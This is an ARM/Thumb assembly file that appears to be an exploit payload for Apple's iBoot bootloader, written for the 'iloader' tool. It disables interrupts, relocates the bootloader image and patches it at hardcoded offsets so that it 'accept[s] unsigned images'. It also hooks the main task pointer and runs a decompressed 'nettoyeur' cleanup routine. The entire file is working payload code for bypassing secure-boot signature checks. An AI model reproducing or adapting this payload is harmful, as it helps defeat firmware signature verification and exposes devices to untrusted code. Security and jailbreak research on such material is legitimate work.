    .text
    .syntax    unified


    .arm
_entry:
    b    _entry


    .org    0x21078
    .thumb
    .thumb_func
_get_current_task:
    bx    lr


    .org    0x22800
    .thumb_func
_arch_cpu_quiesce:
    bx    lr


    .org    0x257f0
    .thumb
    .thumb_func
_decompress_lzss:
    bx    lr


    .org    0x3444c
    .arm
_bcopy:
    bx    lr


    .org    0x34ea0
    .thumb
    .thumb_func
_disable_interrupts:
    bx    lr


    .org    0x478a0
    .thumb
    .thumb_func
_iboot_patch:
    ldr    r0, =0xbff478b2          @ end point of _iboot_patch()
    ldr    r1, =0x84043240          @ payload
    movs   r2, #0x44                @ payload_sz
    blx    _bcopy

    ldr    r0, =0xc2c               @ main_task() ptr
    ldr    r1, =(0xbff43240 + 1)    @ payload_base
    str    r1, [r4, r0]

    b.n     _payload2


    .org    0x47BB0
    .global _payload
    .thumb
    .thumb_func
_payload:
    ldr    sp, =0xBFFF8000
    bl     _disable_interrupts
    ldr    r4, =0x84000000

    ldr    r0, =0xBFF00000          @ could be 0, but we use explicit offset for iloader
    mov    r1, r4
    ldr    r2, =0x446C0
    blx    _bcopy

    b.n    _iboot_patch

_payload2:
    @ accept unsigned images
    ldr    r0, =0x1AD20
    ldr    r1, =0x60182000
    str    r1, [r4, r0]

    bl     _get_current_task
    movs   r1, #0
    str    r1, [r0, #0x44]

    ldr    r0, =0xBFF48000          @ dst
    movs   r1, #0xFC                @ dst_sz
    ldr    r2, =0xBFF47A7C          @ nettoyeur
    movs   r3, #0xe1                @ nettoyeur_sz

    mov    r5, r0
    bl     _decompress_lzss
    ldr    r0, =(0xBFF01770 + 1)

   @b.n    next
_next:
    blx    r0
    bl     _arch_cpu_quiesce
    blx    r5                       @ nettoyeur()
    bx     r4


.align    2


    .org    0x47BF4
    .long   0xe7ffdef0
    .short  0xdef0

next:
    @blx   r0
    @bl    _arch_cpu_quiesce
    @blx   r5                       @ nettoyeur()
    @bx    r4
    nop

.align    2
